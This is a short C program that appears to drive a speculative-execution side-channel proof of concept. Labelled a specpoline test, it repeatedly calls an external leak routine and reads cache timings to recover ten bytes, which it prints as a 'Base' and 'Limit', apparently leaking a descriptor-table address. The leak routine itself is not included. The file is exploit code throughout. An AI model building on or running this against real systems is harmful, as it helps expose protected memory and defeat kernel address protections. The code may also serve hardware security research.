#include <stdio.h>
#include <limits.h>

#if CHAR_BIT != 8
    #error CHAR_BIT MUST BE 8
#endif


extern unsigned int timings[256];
extern void leak(unsigned int off);

unsigned int find_val()
{
    unsigned int val = 0x100, i;

    for (i = 0; i < 256; i++)
    {
        if (timings[i] >= 100)
            continue;
        if (val != 0x100)
            return 0x100;

        val = i;
    }

    return val;
}

void print_byte(unsigned int x)
{
    if (x >= 0x100)
        printf("XX");
    else
        printf("%02x", x);
}

int main()
{
    int i = 0;
    unsigned int off=0;
    int bytes[10];

    int last_val, confirmed, cur_val;

    for (; off < 10; off++)
    {
        i = 0;
        confirmed = 0;
        last_val = 0x100;

        /* Test specpoline */
        while (i++ < 10000)
        {    
          leak(off);
          cur_val = find_val();

          if (last_val == 0x100 || (cur_val != 0x100 && last_val == cur_val))
          {
              confirmed++;
              last_val = cur_val;
          }
          else
          {
              confirmed = 0;
              last_val = 0x100;
          }

          if (confirmed > 5)
              break;
        }

        bytes[off] = last_val;
    }



    /* Show results */
    printf("Base: "); 
      print_byte(bytes[9]);
      print_byte(bytes[8]);
      print_byte(bytes[7]);
      print_byte(bytes[6]);
      print_byte(bytes[5]);
      print_byte(bytes[4]);
      print_byte(bytes[3]);
      print_byte(bytes[2]);
    printf("Limit: ");
      print_byte(bytes[1]);
      print_byte(bytes[0]);
    
    printf("\n\n");

    return 0;    
}
